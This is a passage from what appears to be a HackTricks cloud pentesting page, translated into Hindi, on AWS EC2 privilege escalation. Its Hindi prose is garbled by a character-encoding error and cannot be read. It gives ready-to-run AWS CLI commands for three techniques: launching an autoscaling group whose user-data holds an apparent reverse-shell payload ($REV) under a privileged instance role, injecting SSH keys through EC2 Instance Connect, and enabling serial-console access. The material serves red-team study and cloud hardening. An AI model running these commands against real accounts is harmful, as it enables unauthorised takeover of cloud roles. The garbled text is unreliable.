aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдПрдХ рд╡рд┐рднрд┐рдиреНрди EC2 рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реАрдзрд╛ рдЙрдиреНрдирдпрдиред

### `!autoscaling`

**`ec2:CreateLaunchTemplate`** рдФрд░ **`autoscaling:CreateAutoScalingGroup`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рд╕реЗрдЯ **рдЖрдИрдПрдПрдо рднреВрдорд┐рдХрд╛ рддрдХ рдЙрдиреНрдирдпрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдЙрдиреНрд╣реЗрдВ рд▓реЙрдиреНрдЪ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдпрд╛ рд▓реЙрдиреНрдЪ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рднреВрдорд┐рдХрд╛ рдХреЛ рд╕рдВрд▓рдЧреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЖрдкрдХреЛ рдЕрдиреБрдорддрд┐рдпреЛрдВ `iam:PassRole` рдФрд░ `ec2:RunInstances`** (рдЬреЛ рдПрдХ рдЬреНрдЮрд╛рдд рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рд╣реИ) рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

### `ec2-instance-connect:SendSSHPublicKey`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐ рд╣реИ **`ec2-instance-connect:SendSSHPublicKey`** рдПрдХ рдПрд╕рдПрд╕рдПрдЪ рдХреБрдВрдЬреА рдХреЛ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (рдЕрдЧрд░ рдЙрд╕рдХреЗ рдкрд╛рд╕ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХрд╛ рдПрд╕рдПрд╕рдПрдЪ рдПрдХреНрд╕реЗрд╕ рд╣реИ) рдпрд╛ рдЙрдиреНрдирдпрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдЪрд▓ рд░рд╣реЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрдЬ рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗ EC2 IAM рд░реЛрд▓реНрд╕ рдореЗрдВ рд╕реАрдзрд╛ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рд╡реГрджреНрдзрд┐ред

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** рдЕрдиреБрдорддрд┐ рд╣реИ, **рдПрдХ ssh рдХреБрдВрдЬреА рдХреЛ рдПрдХ рд╕реАрд░рд┐рдпрд▓ рдХрдиреЗрдХреНрд╢рди рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ**ред рдпрджрд┐ рд╕реАрд░рд┐рдпрд▓ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`ec2:EnableSerialConsoleAccess` рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред

рд╕реАрд░рд┐рдпрд▓ рдкреЛрд░реНрдЯ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рднреА рдорд╢реАрди рдХреЗ рдЕрдВрджрд░ рдХреЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

{% code overflow="wrap" %}
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
{% endcode %}

рдпрд╣ рддрд░реАрдХрд╛ рдкреНрд░рд╛рдЗрд╡реЗрд╕реА рдХреЗ рд▓рд┐рдП рдЗрддрдирд╛ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ рдПрдХ рдЙрдкрдпреЛрдХреНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ рдЗрд╕рдХрд╛ рд╢реЛрдз рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** (рдЕрддреНрдпрдзрд┐рдХ рдЕрд╕рд┐рджреНрдз) рдЪрд▓ рд░рд╣реЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрд╕ рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗ EC2 IAM рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ рдкреНрд░рд╛рдЗрд╡реЗрд╕реА рдЙрдиреНрдирддрд┐ред

## рд╕рдВрджрд░реНрдн

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
